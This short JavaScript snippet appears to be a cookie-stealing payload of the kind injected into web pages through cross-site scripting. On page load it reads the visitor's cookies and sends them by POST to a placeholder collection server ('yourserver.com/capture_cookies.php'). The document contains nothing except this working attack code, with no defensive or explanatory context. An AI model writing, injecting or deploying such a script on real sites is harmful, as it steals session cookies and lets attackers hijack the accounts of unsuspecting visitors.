document.addEventListener('DOMContentLoaded', function() {
    fetch('http://yourserver.com/capture_cookies.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ cookies: document.cookie })
    });
});
